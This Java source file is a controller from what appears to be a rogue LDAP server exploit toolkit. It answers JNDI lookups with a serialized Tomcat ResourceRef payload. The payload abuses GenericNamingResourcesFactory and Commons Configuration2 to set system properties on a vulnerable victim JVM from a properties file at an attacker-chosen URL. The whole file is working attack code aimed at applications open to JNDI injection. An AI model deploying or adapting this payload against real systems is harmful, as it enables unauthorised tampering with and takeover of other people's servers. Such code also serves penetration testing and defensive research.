package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields: Sets system properties on the JVM
 * GenericNamingResourcesFactory provides an implementation of the ObjectFactory that can be used to set a property by
 * invoking its setter. The SystemConfiguration class of the Apache CommonsConfiguration2 provides setSystemProperties
 * method that can be used to set the system properties. By making use of these two classes we can set system properties
 * in the JVM by pointing to a URL with properties stored in a text file as key-value pairs.
 *
 * @see https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf
 *
 * Command - URL to the HTTP server that contains the properties file. (text file with property=value pair)
 *
 * Requires: Commons Configuration2
 *
 *  Verified on:
 *  - org.apache.commons:commons-configuration2:2.9.0
 *
 * @author snowyowl
 */

@SuppressWarnings("DuplicatedCode")
@LdapMapping(uri = { "/o=tomcat-set-system-properties" })
public class TomcatSystemProperties implements LdapController {


    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with SystemConfiguration payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        ResourceRef ref = new ResourceRef("org.apache.commons.configuration2.SystemConfiguration", null, "", "",
                true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
        ref.add(new StringRefAddr("systemProperties", Config.command));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
